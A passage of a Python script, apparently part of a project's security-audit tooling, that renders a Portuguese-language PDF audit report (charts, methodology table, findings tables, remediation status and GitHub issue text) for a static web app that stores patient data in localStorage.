    cores_sev = {"CRÍTICA": "#B91C1C", "ALTA": "#EA580C", "MÉDIA": "#D97706", "BAIXA": "#2563EB", "INFORMATIVA": "#6B7280"}

    categorias = [1, 2, 3, 4, 5]
    labels_cat = [textwrap.fill(CATEGORIA_NOME[c], width=13) for c in categorias]

    matriz = {s: [0] * len(categorias) for s in ordem_sev}
    for f in FINDINGS:
        idx = categorias.index(f["categoria"])
        matriz[f["severidade"]][idx] += 1

    fig, ax = plt.subplots(figsize=(7.6, 5.0), dpi=200)
    x = range(len(categorias))
    bottom = [0] * len(categorias)
    for s in ordem_sev:
        vals = matriz[s]
        if sum(vals) == 0:
            continue
        ax.bar(x, vals, bottom=bottom, color=cores_sev[s], label=s.title(), width=0.55)
        bottom = [b + v for b, v in zip(bottom, vals)]

    topo = max(3, max(sum(matriz[s][i] for s in ordem_sev) for i in range(len(categorias))) + 1)
    for i, cat in enumerate(categorias):
        total_cat = sum(matriz[s][i] for s in ordem_sev)
        if total_cat == 0:
            ax.text(i, 0.08, "N/A", ha="center", va="bottom", fontsize=9, color="#6B7280", fontweight="bold")
        else:
            ax.text(i, total_cat + 0.12, str(total_cat), ha="center", va="bottom", fontsize=10, fontweight="bold", color="#1F2937")

    ax.set_xticks(list(x))
    ax.set_xticklabels(labels_cat, fontsize=8.3)
    ax.set_ylabel("Nº de achados", fontsize=10, color="#4B5563")
    ax.set_ylim(0, topo + 1.1)
    ax.spines["top"].set_visible(False)
    ax.spines["right"].set_visible(False)
    ax.tick_params(axis="y", labelsize=9)
    ax.set_title("Achados por Categoria (empilhado por severidade)", fontsize=13, fontweight="bold", color="#1F2937", pad=12)
    ax.legend(
        loc="upper center", bbox_to_anchor=(0.5, -0.16), frameon=False,
        fontsize=8.3, ncol=3, columnspacing=1.2, handletextpad=0.5,
    )
    fig.tight_layout()
    fig.savefig(path_png, bbox_inches="tight", transparent=True)
    plt.close(fig)


# ---------------------------------------------------------------------------
# Documento PDF
# ---------------------------------------------------------------------------

def header_footer(canvas_obj, doc, titulo_pagina=NOME_RELATORIO):
    canvas_obj.saveState()
    largura, altura = A4
    # Header
    canvas_obj.setStrokeColor(colors.HexColor("#E5E7EB"))
    canvas_obj.setLineWidth(0.6)
    canvas_obj.line(MARGEM, altura - 1.35 * cm, largura - MARGEM, altura - 1.35 * cm)
    canvas_obj.setFont("Helvetica", 8.5)
    canvas_obj.setFillColor(COR_TEXTO_SUAVE)
    canvas_obj.drawString(MARGEM, altura - 1.15 * cm, titulo_pagina)
    canvas_obj.drawRightString(largura - MARGEM, altura - 1.15 * cm, PROJETO)

    # Footer
    canvas_obj.line(MARGEM, 1.35 * cm, largura - MARGEM, 1.35 * cm)
    canvas_obj.setFont("Helvetica", 8.5)
    canvas_obj.drawString(MARGEM, 1.0 * cm, f"{NOME_RELATORIO}")
    canvas_obj.drawRightString(largura - MARGEM, 1.0 * cm, f"Página {doc.page}")
    canvas_obj.restoreState()


def cover_page(canvas_obj, doc):
    canvas_obj.saveState()
    largura, altura = A4
    canvas_obj.setFillColor(COR_FUNDO_CAPA)
    canvas_obj.rect(0, 0, largura, altura, fill=1, stroke=0)

    canvas_obj.setFillColor(COR_ACENTO_CAPA)
    canvas_obj.setLineWidth(2)
    canvas_obj.line(MARGEM, altura - 6.6 * cm, largura - MARGEM, altura - 6.6 * cm)

    canvas_obj.setFillColor(colors.white)
    canvas_obj.setFont("Helvetica-Bold", 25)
    canvas_obj.drawString(MARGEM, altura - 5.6 * cm, "Relatório de Auditoria")
    canvas_obj.drawString(MARGEM, altura - 6.35 * cm, "de Segurança")

    canvas_obj.setFillColor(COR_ACENTO_CAPA)
    canvas_obj.setFont("Helvetica-Bold", 17)
    canvas_obj.drawString(MARGEM, altura - 7.5 * cm, f"Projeto: {PROJETO}")

    canvas_obj.setFillColor(colors.HexColor("#CBD5E1"))
    canvas_obj.setFont("Helvetica", 11)
    canvas_obj.drawString(MARGEM, altura - 8.3 * cm, f"Data da auditoria: {DATA_AUDITORIA}")
    canvas_obj.drawString(MARGEM, altura - 8.9 * cm, "Escopo: repositório completo (index.html, css/, js/, assets/, README, CNAME)")

    canvas_obj.setFillColor(colors.HexColor("#94A3B8"))
    canvas_obj.setFont("Helvetica-Oblique", 9)
    canvas_obj.drawString(MARGEM, 2.2 * cm, "Auditoria gerada automaticamente a partir da leitura integral do código-fonte.")
    canvas_obj.drawString(MARGEM, 1.7 * cm, "Regenerar com: docs/security-audit/gerar_relatorio.py")
    canvas_obj.restoreState()


def build_pdf():
    styles = getSampleStyleSheet()

    style_h1 = ParagraphStyle("H1", parent=styles["Heading1"], fontSize=17, spaceAfter=10, spaceBefore=4, textColor=COR_TEXTO)
    style_h2 = ParagraphStyle("H2", parent=styles["Heading2"], fontSize=13.5, spaceAfter=8, spaceBefore=14, textColor=COR_TEXTO)
    style_h3 = ParagraphStyle("H3", parent=styles["Heading3"], fontSize=11.5, spaceAfter=6, spaceBefore=10, textColor=COR_TEXTO)
    style_body = ParagraphStyle("Body", parent=styles["BodyText"], fontSize=9.6, leading=13.6, textColor=COR_TEXTO, spaceAfter=6)
    style_body_small = ParagraphStyle("BodySmall", parent=styles["BodyText"], fontSize=8.7, leading=12.4, textColor=COR_TEXTO_SUAVE)
    style_cell = ParagraphStyle("Cell", parent=styles["BodyText"], fontSize=8.2, leading=11.4, textColor=COR_TEXTO)
    style_cell_mono = ParagraphStyle("CellMono", parent=styles["BodyText"], fontName="Courier", fontSize=7.3, leading=10, textColor=COR_TEXTO)
    style_chip = ParagraphStyle("Chip", parent=styles["BodyText"], fontSize=8.3, leading=10, textColor=colors.white, alignment=TA_CENTER, fontName="Helvetica-Bold")
    style_bullet = ParagraphStyle("Bullet", parent=style_body, leftIndent=12, bulletIndent=0, spaceAfter=5)
    style_code = ParagraphStyle("Code", parent=styles["Code"], fontName="Courier", fontSize=7.6, leading=10.2, backColor=colors.HexColor("#F3F4F6"), textColor=colors.HexColor("#111827"), borderPadding=6, spaceAfter=8, spaceBefore=2)
    style_meta = ParagraphStyle("Meta", parent=style_body_small, textColor=COR_TEXTO_SUAVE)

    tmpdir = tempfile.mkdtemp(prefix="systrong_audit_")
    png_rosca = os.path.join(tmpdir, "rosca.png")
    png_barras = os.path.join(tmpdir, "barras.png")
    gerar_grafico_rosca(png_rosca)
    gerar_grafico_barras(png_barras)

    doc = BaseDocTemplate(OUT_PDF, pagesize=A4, leftMargin=MARGEM, rightMargin=MARGEM, topMargin=MARGEM, bottomMargin=MARGEM, title=NOME_RELATORIO, author="Auditoria de Segurança")

    frame_normal = Frame(MARGEM, MARGEM, A4[0] - 2 * MARGEM, A4[1] - 2 * MARGEM, id="normal")
    frame_cover = Frame(0, 0, A4[0], A4[1], id="cover", leftPadding=0, rightPadding=0, topPadding=0, bottomPadding=0)

    doc.addPageTemplates([
        PageTemplate(id="Cover", frames=[frame_cover], onPage=cover_page),
        PageTemplate(id="Normal", frames=[frame_normal], onPage=header_footer),
    ])

    story = []

    # ---------------- CAPA ----------------
    story.append(NextPageTemplate("Normal"))
    story.append(PageBreak())  # fecha a página de capa (renderizada pelo próprio onPage)

    # ---------------- NOTA METODOLÓGICA ----------------
    story.append(Paragraph("Nota Metodológica", style_h1))
    story.append(Paragraph(
        "Antes da revisão, o repositório foi varrido por completo para identificar a stack do "
        "projeto: <b>frontend estático puro</b> (HTML5 + CSS3 + JavaScript ES6, sem framework, "
        "sem bundler, sem build step), <b>sem backend, sem banco de dados e sem arquivos de "
        "deploy</b> (não há Docker, CI/CD, Helm ou Terraform) — o único artefato de deploy é um "
        "arquivo <font face='Courier'>CNAME</font> para publicação via GitHub Pages no domínio "
        "systrong.com.br. Persistência é feita inteiramente no navegador via "
        "<font face='Courier'>localStorage</font>, e a \"autenticação\" é um estado booleano "
        "mantido no próprio cliente. Com essa stack detectada, cada categoria de auditoria foi "
        "mapeada assim:", style_body))

    metodologia_rows = [
        ["Categoria", "Mecanismo equivalente nesta stack"],
        ["1. Banco sem tranca", "Não há banco de dados/backend. Equivalente auditado: isolamento (ausente) dos dados de pacientes salvos em localStorage, e a robustez do \"portão\" (login) que deveria proteger esse armazenamento."],
        ["2. Permissão no navegador", "Não há papéis (admin/user) distintos — há um único portão de autenticação, auditado quanto a existir (ou não) qualquer verificação server-side equivalente."],
        ["3. IDOR", "Não há rotas/endpoints de backend que recebam IDs de objetos. Categoria avaliada e marcada como não aplicável, com justificativa registrada no corpo do relatório."],
        ["4. Chaves expostas", "Busca por API keys/segredos hardcoded no código-fonte, configs e histórico completo do Git (git log -p --all)."],
        ["5. Inputs sem tratamento (XSS)", "Auditoria de todo uso de innerHTML/template strings com dados de usuário no frontend puro em JavaScript, e verificação da ausência de biblioteca de sanitização (DOMPurify) no projeto."],
    ]
    t_metodologia = Table(metodologia_rows, colWidths=[4.1 * cm, 12.9 * cm])
    t_metodologia.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (-1, 0), COR_TEXTO),
        ("TEXTCOLOR", (0, 0), (-1, 0), colors.white),
        ("FONTNAME", (0, 0), (-1, 0), "Helvetica-Bold"),
        ("FONTSIZE", (0, 0), (-1, -1), 8.3),
        ("VALIGN", (0, 0), (-1, -1), "TOP"),
        ("ROWBACKGROUNDS", (0, 1), (-1, -1), [colors.white, colors.HexColor("#F9FAFB")]),
        ("GRID", (0, 0), (-1, -1), 0.5, colors.HexColor("#E5E7EB")),
        ("LEFTPADDING", (0, 0), (-1, -1), 6),
        ("RIGHTPADDING", (0, 0), (-1, -1), 6),
        ("TOPPADDING", (0, 0), (-1, -1), 5),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 5),
    ]))
    # rewrap descriptive cells as Paragraphs for proper wrapping
    metodologia_rows_p = [metodologia_rows[0]] + [
        [Paragraph(f"<b>{r[0]}</b>", style_cell), Paragraph(r[1], style_cell)] for r in metodologia_rows[1:]
    ]
    t_metodologia = Table(metodologia_rows_p, colWidths=[4.1 * cm, 12.9 * cm])
    t_metodologia.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (-1, 0), COR_TEXTO),
        ("TEXTCOLOR", (0, 0), (-1, 0), colors.white),
        ("FONTNAME", (0, 0), (-1, 0), "Helvetica-Bold"),
        ("FONTSIZE", (0, 0), (-1, 0), 9),
        ("VALIGN", (0, 0), (-1, -1), "TOP"),
        ("ROWBACKGROUNDS", (0, 1), (-1, -1), [colors.white, colors.HexColor("#F9FAFB")]),
        ("GRID", (0, 0), (-1, -1), 0.5, colors.HexColor("#E5E7EB")),
        ("LEFTPADDING", (0, 0), (-1, -1), 6),
        ("RIGHTPADDING", (0, 0), (-1, -1), 6),
        ("TOPPADDING", (0, 0), (-1, -1), 5),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 5),
    ]))
    story.append(t_metodologia)
    story.append(Spacer(1, 0.4 * cm))
    story.append(Paragraph(
        "Todos os achados abaixo foram verificados diretamente no código-fonte lido na íntegra "
        "(index.html, css/styles.css, js/app.js, js/cyber-canvas.js, js/nemotron-core.js, "
        "README.md, .gitignore, CNAME) e no histórico completo do Git. Nenhum achado é "
        "especulativo.", style_meta))

    story.append(PageBreak())

    # ---------------- RESUMO EXECUTIVO ----------------
    story.append(Paragraph("Resumo Executivo", style_h1))

    ordem_sev = ["CRÍTICA", "ALTA", "MÉDIA", "BAIXA", "INFORMATIVA"]
    contagem = {s: 0 for s in ordem_sev}
    for f in FINDINGS:
        contagem[f["severidade"]] += 1

    resumo_cards = []
    for s in ordem_sev:
        cor = SEVERIDADE_COR[s]
        resumo_cards.append(Paragraph(f"<b>{contagem[s]}</b><br/><font size=7>{s}</font>", ParagraphStyle(f"card_{s}", parent=style_chip, fontSize=13, leading=15, textColor=colors.white)))
    t_cards = Table([resumo_cards], colWidths=[3.34 * cm] * 5)
    t_cards.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (0, 0), COR_CRITICA),
        ("BACKGROUND", (1, 0), (1, 0), COR_ALTA),
        ("BACKGROUND", (2, 0), (2, 0), COR_MEDIA),
        ("BACKGROUND", (3, 0), (3, 0), COR_BAIXA),
        ("BACKGROUND", (4, 0), (4, 0), COR_INFO),
        ("VALIGN", (0, 0), (-1, -1), "MIDDLE"),
        ("ALIGN", (0, 0), (-1, -1), "CENTER"),
        ("TOPPADDING", (0, 0), (-1, -1), 10),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 10),
        ("ROUNDEDCORNERS", [4, 4, 4, 4]),
    ]))
    story.append(t_cards)
    story.append(Spacer(1, 0.35 * cm))
    story.append(Paragraph(
        f"Total de <b>{len(FINDINGS)} achados</b> verificados no código, além de "
        f"<b>{len(STRENGTHS)} pontos fortes</b> confirmados. O risco central é a combinação de "
        "autenticação puramente client-side (F1), ausência sistemática de sanitização de "
        "entrada (F2-F7) e prontuário clínico de pacientes salvo sem isolamento (F9) — juntos, "
        "formam uma cadeia completa de exfiltração de dados de saúde sem exigir nenhuma "
        "credencial válida.", style_body))

    story.append(Spacer(1, 0.3 * cm))
    def imagem_proporcional(path_png, largura_alvo):
        from PIL import Image as PILImage
        with PILImage.open(path_png) as im:
            w, h = im.size
        return Image(path_png, width=largura_alvo, height=largura_alvo * h / w)

    img_rosca = imagem_proporcional(png_rosca, 8.3 * cm)
    img_barras = imagem_proporcional(png_barras, 8.3 * cm)
    t_graficos = Table([[img_rosca, img_barras]], colWidths=[8.4 * cm, 8.4 * cm])
    t_graficos.setStyle(TableStyle([("VALIGN", (0, 0), (-1, -1), "TOP")]))
    story.append(t_graficos)

    story.append(PageBreak())

    # ---------------- PONTOS FORTES ----------------
    story.append(Paragraph("Pontos Fortes", style_h1))
    story.append(Paragraph("O que está protegido, com evidência verificada no código:", style_body))
    for titulo, evidencia in STRENGTHS:
        bloco = Table(
            [[Paragraph(f"✔ {titulo}", ParagraphStyle("StrongTitle", parent=style_body, fontName="Helvetica-Bold", textColor=COR_FORTE, spaceAfter=3))],
             [Paragraph(evidencia, style_body_small)]],
            colWidths=[16.6 * cm],
        )
        bloco.setStyle(TableStyle([
            ("BOX", (0, 0), (-1, -1), 0.7, COR_FORTE),
            ("LEFTPADDING", (0, 0), (-1, -1), 10),
            ("RIGHTPADDING", (0, 0), (-1, -1), 10),
            ("TOPPADDING", (0, 0), (-1, -1), 7),
            ("BOTTOMPADDING", (0, 0), (-1, -1), 8),
            ("BACKGROUND", (0, 0), (-1, -1), colors.HexColor("#ECFDF5")),
        ]))
        story.append(KeepTogether([bloco, Spacer(1, 0.24 * cm)]))

    story.append(Spacer(1, 0.2 * cm))
    story.append(Paragraph("Pontos Fracos (riscos centrais)", style_h2))
    for w in WEAKNESSES:
        story.append(Paragraph(f"• {w}", style_bullet))

    story.append(Paragraph("Categoria não aplicável", style_h2))
    story.append(Paragraph(
        "<b>3. IDOR</b> — não se aplica a este projeto: não existem rotas de API/backend que "
        "recebam IDs de objetos e precisem checar posse. As funções client-side que recebem "
        "IDs (selecionarAluno, excluirAluno, atualizarCarga, excluirArquivoPaciente, todas em "
        "js/app.js) operam sobre um único array local, sem fronteira de autorização "
        "multiusuário a ser violada — o risco equivalente nesta stack já está coberto pelos "
        "achados de autenticação (F1) e de isolamento de dados (F9).", style_body))

    story.append(PageBreak())

    # ---------------- TABELA DE ACHADOS DETALHADOS ----------------
    story.append(Paragraph("Achados Detalhados por Categoria", style_h1))

    for cat_id in [1, 2, 3, 4, 5]:
        cat_findings = [f for f in FINDINGS if f["categoria"] == cat_id]
        story.append(Paragraph(f"{cat_id}. {CATEGORIA_NOME[cat_id]}", style_h2))
        if not cat_findings:
            story.append(Paragraph(
                "Nenhum achado nesta categoria — não aplicável a esta stack (ver justificativa "
                "na seção \"Pontos Fortes / Categoria não aplicável\").", style_body))
            continue

        rows = [[Paragraph("<b>Sev.</b>", style_cell), Paragraph("<b>Arquivo:linha</b>", style_cell), Paragraph("<b>Descrição</b>", style_cell)]]
        row_colors = []
        for f in cat_findings:
            chip = Table([[Paragraph(f["severidade"], style_chip)]], colWidths=[2.05 * cm])
            chip.setStyle(TableStyle([
                ("BACKGROUND", (0, 0), (-1, -1), SEVERIDADE_COR[f["severidade"]]),
                ("TOPPADDING", (0, 0), (-1, -1), 4),
                ("BOTTOMPADDING", (0, 0), (-1, -1), 4),
                ("ALIGN", (0, 0), (-1, -1), "CENTER"),
            ]))
            desc = f"<b>{f['id']} — {f['titulo']}</b><br/>{f['descricao']}"
            rows.append([chip, Paragraph(f["arquivo"], style_cell_mono), Paragraph(desc, style_cell)])

        t = Table(rows, colWidths=[2.3 * cm, 4.3 * cm, 10.4 * cm], repeatRows=1)
        t.setStyle(TableStyle([
            ("BACKGROUND", (0, 0), (-1, 0), COR_TEXTO),
            ("TEXTCOLOR", (0, 0), (-1, 0), colors.white),
            ("VALIGN", (0, 0), (-1, -1), "TOP"),
            ("GRID", (0, 0), (-1, -1), 0.5, colors.HexColor("#E5E7EB")),
            ("ROWBACKGROUNDS", (0, 1), (-1, -1), [colors.white, colors.HexColor("#F9FAFB")]),
            ("LEFTPADDING", (0, 0), (-1, -1), 6),
            ("RIGHTPADDING", (0, 0), (-1, -1), 6),
            ("TOPPADDING", (0, 0), (-1, -1), 6),
            ("BOTTOMPADDING", (0, 0), (-1, -1), 6),
        ]))
        story.append(t)
        story.append(Spacer(1, 0.3 * cm))

    story.append(PageBreak())

    # ---------------- DETALHAMENTO TÉCNICO COMPLETO ----------------
    story.append(Paragraph("Detalhamento Técnico dos Achados", style_h1))
    story.append(Paragraph(
        "Evidência de código, análise de exploração e condições necessárias para cada achado, "
        "na ordem em que aparecem na tabela acima.", style_body_small))
    for f in FINDINGS:
        chip = Table([[Paragraph(f["severidade"], style_chip)]], colWidths=[2.6 * cm])
        chip.setStyle(TableStyle([
            ("BACKGROUND", (0, 0), (-1, -1), SEVERIDADE_COR[f["severidade"]]),
            ("TOPPADDING", (0, 0), (-1, -1), 4),
            ("BOTTOMPADDING", (0, 0), (-1, -1), 4),
            ("ALIGN", (0, 0), (-1, -1), "CENTER"),
        ]))
        header_tbl = Table([[Paragraph(f"<b>{f['id']} · {f['titulo']}</b>", style_h3), chip]], colWidths=[13.9 * cm, 2.7 * cm])
        header_tbl.setStyle(TableStyle([("VALIGN", (0, 0), (-1, -1), "MIDDLE"), ("ALIGN", (1, 0), (1, 0), "RIGHT")]))

        bloco = [
            header_tbl,
            Paragraph(f"<b>Arquivo:linha:</b> {f['arquivo']}", style_body_small),
            Paragraph(f["descricao"], style_body),
            Preformatted(f["codigo"], style_code),
            Paragraph(f"<b>Por que é explorável:</b> {f['porque']}", style_body),
            Paragraph(f"<b>Condições de exploração:</b> {f['condicoes']}", style_body_small),
            HRFlowable(width="100%", thickness=0.5, color=colors.HexColor("#E5E7EB"), spaceBefore=6, spaceAfter=10),
        ]
        story.append(KeepTogether(bloco[:4]))
        story.append(bloco[4])
        story.append(bloco[5])
        story.append(bloco[6])

    story.append(PageBreak())

    # ---------------- RECOMENDAÇÕES ----------------
    story.append(Paragraph("Recomendações Priorizadas", style_h1))
    for grupo, itens in RECOMENDACOES.items():
        story.append(Paragraph(grupo, style_h2))
        for item in itens:
            story.append(Paragraph(f"• {item}", style_bullet))

    story.append(PageBreak())

    # ---------------- STATUS DE REMEDIAÇÃO ----------------
    story.append(Paragraph("Status das Correções Aplicadas", style_h1))
    story.append(Paragraph(
        "Em sessão de correção realizada logo após esta auditoria, os achados abaixo foram "
        "tratados diretamente no código. Achados marcados como \"mitigado\" têm sua causa "
        "raiz estrutural (ausência de backend) ainda pendente — o código atual reduz o dano, "
        "mas não substitui uma solução arquitetural real.", style_body))
    story.append(Spacer(1, 0.2 * cm))

    rows_rem = [[Paragraph("<b>ID</b>", style_cell), Paragraph("<b>Status</b>", style_cell), Paragraph("<b>O que foi feito</b>", style_cell)]]
    for f in FINDINGS:
        status, cor_status, detalhe = REMEDIACAO[f["id"]]
        chip = Table([[Paragraph(status, style_chip)]], colWidths=[3.7 * cm])
        chip.setStyle(TableStyle([
            ("BACKGROUND", (0, 0), (-1, -1), cor_status),
            ("TOPPADDING", (0, 0), (-1, -1), 4),
            ("BOTTOMPADDING", (0, 0), (-1, -1), 4),
            ("ALIGN", (0, 0), (-1, -1), "CENTER"),
        ]))
        rows_rem.append([Paragraph(f'<b>{f["id"]}</b>', style_cell), chip, Paragraph(E(detalhe), style_cell)])

    t_rem = Table(rows_rem, colWidths=[1.3 * cm, 4.0 * cm, 11.7 * cm], repeatRows=1)
    t_rem.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (-1, 0), COR_TEXTO),
        ("TEXTCOLOR", (0, 0), (-1, 0), colors.white),
        ("VALIGN", (0, 0), (-1, -1), "TOP"),
        ("GRID", (0, 0), (-1, -1), 0.5, colors.HexColor("#E5E7EB")),
        ("ROWBACKGROUNDS", (0, 1), (-1, -1), [colors.white, colors.HexColor("#F9FAFB")]),
        ("LEFTPADDING", (0, 0), (-1, -1), 6),
        ("RIGHTPADDING", (0, 0), (-1, -1), 6),
        ("TOPPADDING", (0, 0), (-1, -1), 6),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 6),
    ]))
    story.append(t_rem)

    story.append(PageBreak())

    # ---------------- ISSUES PARA O GITHUB ----------------
    story.append(Paragraph("Issues para o GitHub", style_h1))
    story.append(Paragraph(
        "Texto completo, em Markdown, pronto para copiar e colar na criação de cada issue. "
        "Achados triviais relacionados (múltiplos pontos de XSS com a mesma causa raiz) foram "
        "agrupados em uma única issue para evitar spam.", style_body_small))
    story.append(Spacer(1, 0.2 * cm))

    for i, issue in enumerate(ISSUES, start=1):
        story.append(Paragraph(f"Issue {i}: {issue['titulo']}", style_h2))
        story.append(Paragraph(f"<b>Labels sugeridas:</b> {issue['labels']}", style_body_small))
        story.append(Spacer(1, 0.15 * cm))
        marker_open = f"--- ISSUE {i} ---"
        marker_close = f"--- FIM ISSUE {i} ---"
        texto_completo = f"{marker_open}\n## {issue['titulo']}\n\n**Labels:** {issue['labels']}\n\n{issue['corpo'].strip()}\n{marker_close}"
        story.append(Preformatted(texto_completo, style_code))
        story.append(Spacer(1, 0.3 * cm))

    doc.build(story)
    print(f"PDF gerado em: {OUT_PDF}")


if __name__ == "__main__":
    build_pdf()
